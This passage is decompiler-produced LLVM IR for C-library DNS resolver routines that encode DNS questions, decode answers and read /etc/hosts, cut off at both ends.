  uselistorder i8 2, { 0, 1, 2, 3, 4, 16, 5, 13, 21, 17, 6, 18, 7, 8, 9, 10, 11, 19, 20, 12, 14, 15 }
  uselistorder i8 4, { 0, 3, 1, 4, 5, 2 }
  uselistorder i8 16, { 0, 1, 2, 6, 7, 8, 3, 4, 5 }
  uselistorder i8 8, { 0, 7, 2, 6, 3, 1, 4, 5 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8053cd4 = load i32, i32* @edi, align 4
  %v0_8053cd5 = load i32, i32* @esi, align 4
  %v0_8053cd6 = load i32, i32* @ebx, align 4
  store i32 %v0_8053cd6, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v0_8053ce3 = load i32, i32* @eax, align 4
  %v1_8053ce6 = inttoptr i32 %tmp3 to i32*
  %v2_8053ce6 = load i32, i32* %v1_8053ce6, align 4
  %v7_8053ce8 = inttoptr i32 %v2_8053ce6 to i8*
  %v8_8053ce8 = call i32 @__encode_dotted(i8* %v7_8053ce8, i32 %tmp2, i32 %tmp, i32 %v0_8053ce3, i32 %v0_8053cd6, i32 %v0_8053cd5, i32 %v0_8053cd4)
  store i32 %v8_8053ce8, i32* @ecx, align 4
  %v2_8053cf2 = icmp slt i32 %v8_8053ce8, 0
  br i1 %v2_8053cf2, label %dec_label_pc_8053d21, label %dec_label_pc_8053cf6

dec_label_pc_8053cf6:                             ; preds = %entry
  %v0_8053cf6 = load i32, i32* @ebx, align 4
  %v2_8053cf6 = sub i32 %v0_8053cf6, %v8_8053ce8
  %v1_8053cf8 = add i32 %v2_8053cf6, -3
  %v6_8053cf8 = sub i32 2, %v2_8053cf6
  %v7_8053cf8 = and i32 %v6_8053cf8, %v2_8053cf6
  %v8_8053cf8 = icmp slt i32 %v7_8053cf8, 0
  %v9_8053cf8 = icmp eq i32 %v1_8053cf8, 0
  %v10_8053cf8 = icmp slt i32 %v1_8053cf8, 0
  %v3_8053cfb = icmp eq i1 %v10_8053cf8, %v8_8053cf8
  %v4_8053cfb = icmp eq i1 %v9_8053cf8, false
  %v5_8053cfb = and i1 %v4_8053cfb, %v3_8053cfb
  br i1 %v5_8053cfb, label %dec_label_pc_8053d02, label %dec_label_pc_8053cfd

dec_label_pc_8053cfd:                             ; preds = %dec_label_pc_8053cf6
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8053d21

dec_label_pc_8053d02:                             ; preds = %dec_label_pc_8053cf6
  %v0_8053d02 = load i32, i32* @edi, align 4
  %v2_8053d02 = add i32 %v0_8053d02, %v8_8053ce8
  store i32 %v2_8053d02, i32* @edx, align 4
  %v1_8053d05 = add i32 %v8_8053ce8, 4
  store i32 %v1_8053d05, i32* @ecx, align 4
  %v0_8053d08 = load i32, i32* @esi, align 4
  %v1_8053d08 = add i32 %v0_8053d08, 5
  %v2_8053d08 = inttoptr i32 %v1_8053d08 to i8*
  %v3_8053d08 = load i8, i8* %v2_8053d08, align 1
  %v3_8053d0c = inttoptr i32 %v2_8053d02 to i8*
  store i8 %v3_8053d08, i8* %v3_8053d0c, align 1
  %v0_8053d0e = load i32, i32* @esi, align 4
  %v1_8053d0e = add i32 %v0_8053d0e, 4
  %v2_8053d0e = inttoptr i32 %v1_8053d0e to i32*
  %v3_8053d0e = load i32, i32* %v2_8053d0e, align 4
  %v1_8053d11 = trunc i32 %v3_8053d0e to i8
  %v2_8053d11 = load i32, i32* @edx, align 4
  %v3_8053d11 = add i32 %v2_8053d11, 1
  %v4_8053d11 = inttoptr i32 %v3_8053d11 to i8*
  store i8 %v1_8053d11, i8* %v4_8053d11, align 1
  %v0_8053d14 = load i32, i32* @esi, align 4
  %v1_8053d14 = add i32 %v0_8053d14, 9
  %v2_8053d14 = inttoptr i32 %v1_8053d14 to i8*
  %v3_8053d14 = load i8, i8* %v2_8053d14, align 1
  %v2_8053d18 = load i32, i32* @edx, align 4
  %v3_8053d18 = add i32 %v2_8053d18, 2
  %v4_8053d18 = inttoptr i32 %v3_8053d18 to i8*
  store i8 %v3_8053d14, i8* %v4_8053d18, align 1
  %v0_8053d1b = load i32, i32* @esi, align 4
  %v1_8053d1b = add i32 %v0_8053d1b, 8
  %v2_8053d1b = inttoptr i32 %v1_8053d1b to i32*
  %v3_8053d1b = load i32, i32* %v2_8053d1b, align 4
  %v1_8053d1e = trunc i32 %v3_8053d1b to i8
  %v2_8053d1e = load i32, i32* @edx, align 4
  %v3_8053d1e = add i32 %v2_8053d1e, 3
  %v4_8053d1e = inttoptr i32 %v3_8053d1e to i8*
  store i8 %v1_8053d1e, i8* %v4_8053d1e, align 1
  %v0_8053d21.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8053d21

dec_label_pc_8053d21:                             ; preds = %entry, %dec_label_pc_8053cfd, %dec_label_pc_8053d02
  %v0_8053d21 = phi i32 [ %v8_8053ce8, %entry ], [ -1, %dec_label_pc_8053cfd ], [ %v0_8053d21.pre, %dec_label_pc_8053d02 ]
  %v2_8053d23 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053d23, i32* @ebx, align 4
  store i32 %v0_8053cd4, i32* @edi, align 4
  ret i32 %v0_8053d21

; uselistorder directives
  uselistorder i32 %v1_8053cf8, { 1, 0 }
  uselistorder i32 %v2_8053cf6, { 0, 2, 1 }
  uselistorder i32 %v8_8053ce8, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 6, 4, 0, 5 }
  uselistorder label %dec_label_pc_8053d21, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v2_8053d33 = call i32 @__length_dotted(i32 %tmp, i32 %tmp2)
  %v2_8053d3b = icmp slt i32 %v2_8053d33, 0
  br i1 %v2_8053d3b, label %dec_label_pc_8053d42, label %dec_label_pc_8053d3f

dec_label_pc_8053d3f:                             ; preds = %entry
  %v1_8053d3f = add i32 %v2_8053d33, 4
  br label %dec_label_pc_8053d42

dec_label_pc_8053d42:                             ; preds = %entry, %dec_label_pc_8053d3f
  %v0_8053d45 = phi i32 [ %v2_8053d33, %entry ], [ %v1_8053d3f, %dec_label_pc_8053d3f ]
  ret i32 %v0_8053d45

; uselistorder directives
  uselistorder label %dec_label_pc_8053d42, { 1, 0 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8053d48 = load i32, i32* @ebp, align 4
  %v0_8053d49 = load i32, i32* @edi, align 4
  %v0_8053d4a = load i32, i32* @esi, align 4
  %v0_8053d4b = load i32, i32* @ebx, align 4
  store i32 %v0_8053d4b, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8053d6c = ptrtoint i32* %stack_var_-272 to i32
  %v4_8053d79 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_8053d6c, i32 256)
  store i32 %v4_8053d79, i32* @edi, align 4
  %v3_8053d83 = icmp slt i32 %v4_8053d79, 0
  br i1 %v3_8053d83, label %dec_label_pc_8053e34, label %dec_label_pc_8053d8b

dec_label_pc_8053d8b:                             ; preds = %entry
  %v0_8053d8b = load i32, i32* @ebx, align 4
  %v3_8053d8b = add i32 %v0_8053d8b, %v4_8053d79
  %v0_8053d8d = load i32, i32* @esi, align 4
  %v2_8053d8d = sub i32 %v0_8053d8d, %v3_8053d8b
  %v1_8053d93 = add i32 %v2_8053d8d, -10
  %v10_8053d93 = icmp slt i32 %v1_8053d93, 0
  store i32 %v1_8053d93, i32* @esi, align 4
  %v1_8053d9a = icmp eq i1 %v10_8053d93, false
  br i1 %v1_8053d9a, label %dec_label_pc_8053da3, label %dec_label_pc_8053d9c

dec_label_pc_8053d9c:                             ; preds = %dec_label_pc_8053d8b
  br label %dec_label_pc_8053e34

dec_label_pc_8053da3:                             ; preds = %dec_label_pc_8053d8b
  %v6_8053daa = add i32 %v3_8053d8b, %tmp4
  store i32 %v6_8053daa, i32* @ebx, align 4
  %v1_8053db6 = bitcast i32* %stack_var_-272 to i8*
  %v2_8053db6 = call i32 @__GI_strdup(i8* %v1_8053db6)
  %v1_8053dbb = load i32, i32* @ebp, align 4
  %v2_8053dbb = inttoptr i32 %v1_8053dbb to i32*
  store i32 %v2_8053db6, i32* %v2_8053dbb, align 4
  %v0_8053dbe = load i32, i32* @ebx, align 4
  %v1_8053dbe = add i32 %v0_8053dbe, 4
  store i32 %v1_8053dbe, i32* %esi.global-to-local, align 4
  %v1_8053dc1 = inttoptr i32 %v0_8053dbe to i8*
  %v2_8053dc1 = load i8, i8* %v1_8053dc1, align 1
  %v3_8053dc1 = zext i8 %v2_8053dc1 to i32
  %v1_8053dc4 = add i32 %v0_8053dbe, 1
  %v2_8053dc4 = inttoptr i32 %v1_8053dc4 to i8*
  %v3_8053dc4 = load i8, i8* %v2_8053dc4, align 1
  %v4_8053dc4 = zext i8 %v3_8053dc4 to i32
  %v2_8053dc8 = mul nuw nsw i32 %v3_8053dc1, 256
  %v2_8053dcb = or i32 %v4_8053dc4, %v2_8053dc8
  %v1_8053dcd = load i32, i32* @ebp, align 4
  %v2_8053dcd = add i32 %v1_8053dcd, 4
  %v3_8053dcd = inttoptr i32 %v2_8053dcd to i32*
  store i32 %v2_8053dcb, i32* %v3_8053dcd, align 4
  %v0_8053dd0 = load i32, i32* @ebx, align 4
  %v1_8053dd0 = add i32 %v0_8053dd0, 2
  %v2_8053dd0 = inttoptr i32 %v1_8053dd0 to i8*
  %v3_8053dd0 = load i8, i8* %v2_8053dd0, align 1
  %v4_8053dd0 = zext i8 %v3_8053dd0 to i32
  %v1_8053dd4 = add i32 %v0_8053dd0, 3
  %v2_8053dd4 = inttoptr i32 %v1_8053dd4 to i8*
  %v3_8053dd4 = load i8, i8* %v2_8053dd4, align 1
  %v4_8053dd4 = zext i8 %v3_8053dd4 to i32
  %v2_8053dd8 = mul nuw nsw i32 %v4_8053dd0, 256
  %v2_8053ddb = or i32 %v4_8053dd4, %v2_8053dd8
  %v1_8053ddd = load i32, i32* @ebp, align 4
  %v2_8053ddd = add i32 %v1_8053ddd, 8
  %v3_8053ddd = inttoptr i32 %v2_8053ddd to i32*
  store i32 %v2_8053ddb, i32* %v3_8053ddd, align 4
  %v0_8053de0 = load i32, i32* @ebx, align 4
  %v1_8053de0 = add i32 %v0_8053de0, 4
  %v2_8053de0 = inttoptr i32 %v1_8053de0 to i8*
  %v3_8053de0 = load i8, i8* %v2_8053de0, align 1
  %v4_8053de0 = zext i8 %v3_8053de0 to i32
  %v0_8053de4 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053de4 = add i32 %v0_8053de4, 1
  %v2_8053de4 = inttoptr i32 %v1_8053de4 to i8*
  %v3_8053de4 = load i8, i8* %v2_8053de4, align 1
  %v4_8053de4 = zext i8 %v3_8053de4 to i32
  %v2_8053de8 = mul nuw i32 %v4_8053de0, 16777216
  %v2_8053deb = mul nuw nsw i32 %v4_8053de4, 65536
  %v1_8053dee = add i32 %v0_8053de4, 2
  %v2_8053dee = inttoptr i32 %v1_8053dee to i8*
  %v3_8053dee = load i8, i8* %v2_8053dee, align 1
  %v4_8053dee = zext i8 %v3_8053dee to i32
  %v2_8053df2 = mul nuw nsw i32 %v4_8053dee, 256
  %v2_8053df5 = or i32 %v2_8053deb, %v2_8053de8
  %v1_8053df7 = add i32 %v0_8053de4, 3
  %v2_8053df7 = inttoptr i32 %v1_8053df7 to i8*
  %v3_8053df7 = load i8, i8* %v2_8053df7, align 1
  %v4_8053df7 = zext i8 %v3_8053df7 to i32
  %v2_8053dfb = or i32 %v4_8053df7, %v2_8053df5
  %v2_8053dfd = or i32 %v2_8053dfb, %v2_8053df2
  store i32 %v2_8053dfd, i32* @ecx, align 4
  %v1_8053dff = load i32, i32* @ebp, align 4
  %v2_8053dff = add i32 %v1_8053dff, 12
  %v3_8053dff = inttoptr i32 %v2_8053dff to i32*
  store i32 %v2_8053dfd, i32* %v3_8053dff, align 4
  %v0_8053e02 = load i32, i32* @ebx, align 4
  %v1_8053e02 = add i32 %v0_8053e02, 8
  %v2_8053e02 = inttoptr i32 %v1_8053e02 to i8*
  %v3_8053e02 = load i8, i8* %v2_8053e02, align 1
  %v4_8053e02 = zext i8 %v3_8053e02 to i32
  %v1_8053e06 = add i32 %v0_8053e02, 9
  %v2_8053e06 = inttoptr i32 %v1_8053e06 to i8*
  %v3_8053e06 = load i8, i8* %v2_8053e06, align 1
  %v4_8053e06 = zext i8 %v3_8053e06 to i32
  %v2_8053e0a = mul nuw nsw i32 %v4_8053e02, 256
  %v1_8053e0d = add i32 %v0_8053e02, 10
  %v2_8053e10 = or i32 %v4_8053e06, %v2_8053e0a
  store i32 %v2_8053e10, i32* @edx, align 4
  %v1_8053e12 = load i32, i32* @ebp, align 4
  %v2_8053e12 = add i32 %v1_8053e12, 20
  %v3_8053e12 = inttoptr i32 %v2_8053e12 to i32*
  store i32 %v1_8053e0d, i32* %v3_8053e12, align 4
  %v0_8053e15 = load i32, i32* @edx, align 4
  %v1_8053e15 = load i32, i32* @ebp, align 4
  %v2_8053e15 = add i32 %v1_8053e15, 16
  %v3_8053e15 = inttoptr i32 %v2_8053e15 to i32*
  store i32 %v0_8053e15, i32* %v3_8053e15, align 4
  %v1_8053e1f = add i32 %v3_8053d8b, 10
  %v1_8053e22 = load i32, i32* @ebp, align 4
  %v2_8053e22 = add i32 %v1_8053e22, 24
  %v3_8053e22 = inttoptr i32 %v2_8053e22 to i32*
  store i32 %v1_8053e1f, i32* %v3_8053e22, align 4
  %v4_8053e25 = load i32, i32* @edx, align 4
  %v5_8053e29 = icmp slt i32 %v1_8053d93, %v4_8053e25
  br i1 %v5_8053e29, label %dec_label_pc_8053e2b, label %dec_label_pc_8053e30

dec_label_pc_8053e2b:                             ; preds = %dec_label_pc_8053da3
  br label %dec_label_pc_8053e34

dec_label_pc_8053e30:                             ; preds = %dec_label_pc_8053da3
  %v1_8053e30 = load i32, i32* @edi, align 4
  %v2_8053e30 = add i32 %v4_8053e25, 10
  %v3_8053e30 = add i32 %v2_8053e30, %v1_8053e30
  br label %dec_label_pc_8053e34

dec_label_pc_8053e34:                             ; preds = %entry, %dec_label_pc_8053e2b, %dec_label_pc_8053d9c, %dec_label_pc_8053e30
  %v0_8053e3a = phi i32 [ %v4_8053d79, %entry ], [ -1, %dec_label_pc_8053e2b ], [ %v1_8053d93, %dec_label_pc_8053d9c ], [ %v3_8053e30, %dec_label_pc_8053e30 ]
  %v2_8053e3c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053e3c, i32* @ebx, align 4
  store i32 %v0_8053d4a, i32* @esi, align 4
  store i32 %v0_8053d49, i32* @edi, align 4
  store i32 %v0_8053d48, i32* @ebp, align 4
  ret i32 %v0_8053e3a

; uselistorder directives
  uselistorder i32 %v1_8053d93, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8053d8b, { 1, 0, 2 }
  uselistorder i32 %v4_8053d79, { 1, 0, 2, 3 }
  uselistorder i32 24, { 29, 30, 19, 0, 31, 32, 33, 20, 5, 10, 36, 11, 12, 13, 34, 21, 22, 23, 24, 25, 26, 27, 38, 2, 35, 14, 15, 16, 17, 18, 3, 4, 6, 7, 8, 1, 9, 28, 37 }
  uselistorder i32 20, { 34, 35, 36, 37, 5, 23, 41, 8, 42, 38, 39, 6, 24, 25, 4, 11, 12, 33, 13, 14, 15, 26, 27, 28, 0, 29, 1, 30, 9, 31, 32, 44, 40, 7, 16, 17, 18, 19, 20, 21, 22, 3, 2, 43, 10 }
  uselistorder i32 9, { 17, 18, 19, 20, 7, 21, 11, 12, 4, 10, 3, 8, 13, 14, 15, 16, 6, 9, 5, 1, 0, 22, 23, 2 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 10, 9 }
  uselistorder i32 3, { 46, 47, 48, 49, 50, 51, 25, 3, 26, 15, 45, 7, 52, 27, 9, 8, 4, 1, 2, 0, 28, 5, 29, 38, 16, 39, 33, 53, 17, 18, 34, 30, 14, 11, 12, 10, 13, 32, 44, 31, 35, 19, 36, 20, 37, 40, 41, 42, 43, 21, 22, 23, 24, 6 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8053e34, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_8053e51 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_80574e5.285 to i32), i32 ptrtoint (i32* @global_var_80574b0.273 to i32))
  store i32 %v3_8053e51, i32* @eax, align 4
  %v1_8053e59 = icmp eq i32 %v3_8053e51, 0
  %v1_8053e5b = icmp eq i1 %v1_8053e59, false
  br i1 %v1_8053e5b, label %dec_label_pc_8053e71, label %dec_label_pc_8053e5d

dec_label_pc_8053e5d:                             ; preds = %entry
  %v3_8053e69 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_80574f0.286 to i32), i32 ptrtoint (i32* @global_var_80574b0.273 to i32))
  br label %dec_label_pc_8053e71

dec_label_pc_8053e71:                             ; preds = %entry, %dec_label_pc_8053e5d
  %v0_8053e74 = phi i32 [ %v3_8053e51, %entry ], [ %v3_8053e69, %dec_label_pc_8053e5d ]
  ret i32 %v0_8053e74

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 0, 1, 6, 5, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_80574b0.273 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_8053e71, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp59 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_8053e75 = load i32, i32* @ebp, align 4
  %v0_8053e76 = load i32, i32* @edi, align 4
  %v0_8053e77 = load i32, i32* @esi, align 4
  %v0_8053e78 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_8053e86 = sub i32 0, %arg6
  %v1_8053e88 = urem i32 %v1_8053e86, 4
  %v2_8053e88 = icmp eq i32 %v1_8053e88, 0
  store i32 %v1_8053e88, i32* %eax.global-to-local, align 4
  br i1 %v2_8053e88, label %dec_label_pc_8053e99, label %dec_label_pc_8053e8d

dec_label_pc_8053e8d:                             ; preds = %entry
  %v2_8053e8d = sub i32 %arg7, %v1_8053e88
  %v7_8053e8d = icmp ugt i32 %v1_8053e88, %arg7
  br i1 %v7_8053e8d, label %dec_label_pc_805413d, label %dec_label_pc_8053e95

dec_label_pc_8053e95:                             ; preds = %dec_label_pc_8053e8d
  %v2_8053e95 = add i32 %v1_8053e88, %arg6
  store i32 %v2_8053e95, i32* @ebx, align 4
  store i32 %v2_8053e8d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053e99

dec_label_pc_8053e99:                             ; preds = %entry, %dec_label_pc_8053e95
  %v0_8053ea2 = phi i32 [ %arg6, %entry ], [ %v2_8053e95, %dec_label_pc_8053e95 ]
  %v0_8053ea5 = phi i32 [ %arg7, %entry ], [ %v2_8053e8d, %dec_label_pc_8053e95 ]
  %tmp149 = icmp ult i32 %v0_8053ea5, 32
  br i1 %tmp149, label %dec_label_pc_805413d, label %dec_label_pc_8053ea2

dec_label_pc_8053ea2:                             ; preds = %dec_label_pc_8053e99
  %v1_8053ea2 = add i32 %v0_8053ea2, 32
  store i32 %v1_8053ea2, i32* %eax.global-to-local, align 4
  %v1_8053ea5 = add i32 %v0_8053ea5, -32
  store i32 %v1_8053ea5, i32* @ebp, align 4
  %v5_8053ea8 = inttoptr i32 %v1_8053ea2 to i8*
  %v12_8053eac = icmp eq i32 %arg4, 1
  br i1 %v12_8053eac, label %dec_label_pc_8053fce, label %dec_label_pc_8053eb7

dec_label_pc_8053eb7:                             ; preds = %dec_label_pc_8053ea2
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_8053ebe = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_8053ebe, align 4
  %tmp150 = icmp ult i32 %v1_8053ea5, 4
  br i1 %tmp150, label %dec_label_pc_805413d, label %dec_label_pc_8053eca

dec_label_pc_8053eca:                             ; preds = %dec_label_pc_8053eb7
  %v0_8053eca = load i32, i32* %edx.global-to-local, align 4
  %v1_8053eca = add i32 %v0_8053eca, -36
  store i32 %v1_8053eca, i32* %eax.global-to-local, align 4
  %tmp151 = icmp ult i32 %v1_8053eca, 8
  br i1 %tmp151, label %dec_label_pc_805413d, label %dec_label_pc_8053ed6

dec_label_pc_8053ed6:                             ; preds = %dec_label_pc_8053eca
  %v0_8053ed6 = load i32, i32* @ebp, align 4
  %tmp152 = icmp ult i32 %v0_8053ed6, 16
  br i1 %tmp152, label %dec_label_pc_805413d, label %dec_label_pc_8053edf

dec_label_pc_8053edf:                             ; preds = %dec_label_pc_8053ed6
  %v1_8053edf = add i32 %v0_8053eca, -48
  store i32 %v1_8053edf, i32* %eax.global-to-local, align 4
  %tmp153 = icmp ult i32 %v1_8053edf, 8
  br i1 %tmp153, label %dec_label_pc_805413d, label %dec_label_pc_8053eeb

dec_label_pc_8053eeb:                             ; preds = %dec_label_pc_8053edf
  %v0_8053eeb = load i32, i32* @ebx, align 4
  %v1_8053eeb = add i32 %v0_8053eeb, 48
  %v1_8053eee = add i32 %v0_8053eca, -44
  store i32 %v1_8053eee, i32* @ebp, align 4
  %v1_8053ef5 = add i32 %v0_8053eca, -56
  store i32 %v1_8053ef5, i32* @eax, align 4
  %v1_8053ef8 = add i32 %v0_8053eeb, 36
  store i32 %v1_8053ef8, i32* @edi, align 4
  %v7_8053efb = icmp ult i32 %v1_8053ef5, %v1_8053eee
  br i1 %v7_8053efb, label %dec_label_pc_8053f04, label %dec_label_pc_8053eff

dec_label_pc_8053eff:                             ; preds = %dec_label_pc_8053eeb
  %v1_8053eff = add i32 %v0_8053eeb, 44
  store i32 %v1_8053eff, i32* @esi, align 4
  br label %dec_label_pc_8053f09

dec_label_pc_8053f04:                             ; preds = %dec_label_pc_8053eeb
  %v1_8053f04 = add i32 %v0_8053eeb, 56
  store i32 %v1_8053f04, i32* @esi, align 4
  store i32 %v1_8053ef5, i32* @ebp, align 4
  br label %dec_label_pc_8053f09

dec_label_pc_8053f09:                             ; preds = %dec_label_pc_8053eff, %dec_label_pc_8053f04
  %v0_8053f09 = phi i32 [ %v1_8053eee, %dec_label_pc_8053eff ], [ %v1_8053ef5, %dec_label_pc_8053f04 ]
  %tmp154 = icmp ult i32 %v0_8053f09, 80
  br i1 %tmp154, label %dec_label_pc_805413d, label %dec_label_pc_8053f12

dec_label_pc_8053f12:                             ; preds = %dec_label_pc_8053f09
  %v0_8053f12 = call i32 @__open_etc_hosts()
  store i32 %v0_8053f12, i32* %eax.global-to-local, align 4
  %v1_8053f1b = icmp eq i32 %v0_8053f12, 0
  br i1 %v1_8053f1b, label %dec_label_pc_8053f3f, label %dec_label_pc_8053f1f

dec_label_pc_8053f1f:                             ; preds = %dec_label_pc_8053f12
  store i32 %v1_8053ea2, i32* %edx.global-to-local, align 4
  store i32 %v1_8053eeb, i32* %eax.global-to-local, align 4
  store i8* %v5_8053ea8, i8** %stack_var_-44, align 4
  %v0_8053f2a = load i32, i32* @edi, align 4
  %v0_8053f36 = load i32, i32* @esi, align 4
  %v5_8053f36 = inttoptr i32 %v0_8053f36 to i8*
  br label %dec_label_pc_8053fed

dec_label_pc_8053f3f:                             ; preds = %dec_label_pc_8053f12
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_8053f43 = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_8053f43, align 4
  %v1_8053f49 = call i32 @__errno_location(i32 0)
  store i32 %v1_8053f49, i32* %eax.global-to-local, align 4
  %v1_8053f4e = inttoptr i32 %v1_8053f49 to i32*
  %v2_8053f4e = load i32, i32* %v1_8053f4e, align 4
  store i32 %v2_8053f4e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805413d

dec_label_pc_8053f59:                             ; preds = %dec_label_pc_80540c0
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_8053f5d = load i8*, i8** %stack_var_-44, align 4
  %v3_8053f5d = ptrtoint i8* %v2_8053f5d to i32
  %v2_8053f60 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8053f5d, i32* %v2_8053f60, align 4
  %v0_8053f62 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053f62 = add i32 %v0_8053f62, 4
  %v2_8053f62 = inttoptr i32 %v1_8053f62 to i32*
  store i32 0, i32* %v2_8053f62, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8053f6d = load i32, i32* @ebx, align 4
  %v1_8053f6d = add i32 %v0_8053f6d, 4
  %v2_8053f6d = inttoptr i32 %v1_8053f6d to i32*
  %v3_8053f6d = load i32, i32* %v2_8053f6d, align 4
  store i32 %v3_8053f6d, i32* %eax.global-to-local, align 4
  store i32 %v3_8053f6d, i32* %arg5, align 4
  %v0_8053f72 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053f72 = add i32 %v0_8053f72, 8
  %v2_8053f72 = inttoptr i32 %v1_8053f72 to i32*
  store i32 2, i32* %v2_8053f72, align 4
  %v0_8053f79 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053f79 = add i32 %v0_8053f79, 12
  %v2_8053f79 = inttoptr i32 %v1_8053f79 to i32*
  store i32 4, i32* %v2_8053f79, align 4
  br label %dec_label_pc_8053fb2

dec_label_pc_8053f86:                             ; preds = %dec_label_pc_80540e2
  store i32 %stack_var_-32.0, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  %v2_8053f8e = inttoptr i32 %stack_var_-32.0 to i32*
  store i32 %stack_var_-36.0, i32* %v2_8053f8e, align 4
  %v0_8053f90 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053f90 = add i32 %v0_8053f90, 4
  %v2_8053f90 = inttoptr i32 %v1_8053f90 to i32*
  store i32 0, i32* %v2_8053f90, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8053f9b = load i32, i32* @ebx, align 4
  %v1_8053f9b = add i32 %v0_8053f9b, 4
  %v2_8053f9b = inttoptr i32 %v1_8053f9b to i32*
  %v3_8053f9b = load i32, i32* %v2_8053f9b, align 4
  store i32 %v3_8053f9b, i32* %eax.global-to-local, align 4
  store i32 %v3_8053f9b, i32* %arg5, align 4
  %v0_8053fa0 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053fa0 = add i32 %v0_8053fa0, 8
  %v2_8053fa0 = inttoptr i32 %v1_8053fa0 to i32*
  store i32 10, i32* %v2_8053fa0, align 4
  %v0_8053fa7 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053fa7 = add i32 %v0_8053fa7, 12
  %v2_8053fa7 = inttoptr i32 %v1_8053fa7 to i32*
  store i32 16, i32* %v2_8053fa7, align 4
  br label %dec_label_pc_8053fb2

dec_label_pc_8053fb2:                             ; preds = %dec_label_pc_8053f59, %dec_label_pc_8053f86
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8053f59 ], [ %stack_var_-32.0, %dec_label_pc_8053f86 ]
  %v1_8053fb2 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053fb2 = add i32 %v1_8053fb2, 16
  %v3_8053fb2 = inttoptr i32 %v2_8053fb2 to i32*
  store i32 %storemerge, i32* %v3_8053fb2, align 4
  %v0_8053fb5 = load i32, i32* @ebx, align 4
  %v1_8053fb5 = add i32 %v0_8053fb5, 8
  %v1_8053fb8 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053fb8 = add i32 %v1_8053fb8, 4
  %v3_8053fb8 = inttoptr i32 %v2_8053fb8 to i32*
  store i32 %v1_8053fb5, i32* %v3_8053fb8, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_8053fbf = load i32, i32* %edx.global-to-local, align 4
  %v2_8053fbf = inttoptr i32 %arg8 to i32*
  store i32 %v0_8053fbf, i32* %v2_8053fbf, align 4
  br label %dec_label_pc_805411d

dec_label_pc_8053fce:                             ; preds = %dec_label_pc_8053ea2
  store i8* null, i8** %stack_var_-44, align 4
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8053fed

dec_label_pc_8053fed:                             ; preds = %dec_label_pc_8053f1f, %dec_label_pc_8053fce
  %v1_8053ff1.pre-phi = phi i32* [ %v1_8053ebe, %dec_label_pc_8053f1f ], [ %.pre, %dec_label_pc_8053fce ]
  %stack_var_-32.0 = phi i32 [ %v1_8053eeb, %dec_label_pc_8053f1f ], [ 0, %dec_label_pc_8053fce ]
  %stack_var_-36.0 = phi i32 [ %v1_8053ea2, %dec_label_pc_8053f1f ], [ 0, %dec_label_pc_8053fce ]
